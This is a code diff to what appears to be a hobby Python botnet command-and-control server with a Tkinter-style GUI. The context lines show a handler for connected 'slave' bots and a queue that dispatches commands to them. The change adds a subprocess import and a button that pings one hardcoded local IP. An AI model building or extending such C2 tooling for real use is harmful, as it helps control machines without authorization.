@@ -8,7 +8,7 @@ import os
 import threading
 import queue
 import time
-
+import subprocess 
 q = queue.Queue()
 Socketthread = []
 ClientList = {}
@@ -28,6 +28,7 @@ class BotHandler(threading.Thread):
         BotName = threading.current_thread().getName()
         print("[*] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: ", BotName)
         ClientList[BotName] = self.client_address
+        
         while True:
             RecvBotCmd = self.q.get()
             # print("\nReceived Command: " + RecvBotCmd + " for " + BotName)
@@ -143,17 +144,30 @@ class botservergui:
         #lblcommandsent.configure(text='Sending PWD command')
 	    
     def on_whoami_clicked(self):
-        
         textboxoutput = self.builder.get_object('textboxoutput')
         textboxoutput.insert('1.0', "User is " + getpass.getuser() +"\n")
         
 
     def on_host_clicked(self):
-        
         textboxoutput = self.builder.get_object('textboxoutput')
         textboxoutput.insert('1.0', "Socket is " + socket.gethostname() +"\n")
         
+    def on_scanNetwork_clicked(self):
+      
+        address = "192.168.1.118"
+    
+        res = subprocess.call(['ping', '-c', '3', address]) 
+        if res == 0: 
+            print( "ping to", address, "OK") 
+        elif res == 2: 
+            print("no response from", address) 
+        else: 
+            print("ping to", address, "failed!") 
+
+
+
     #make start listening button using threats so the gui dosent hang
+
     def on_start_listen(self):
         t = threading.Thread(target=sethostport)
         t.start()
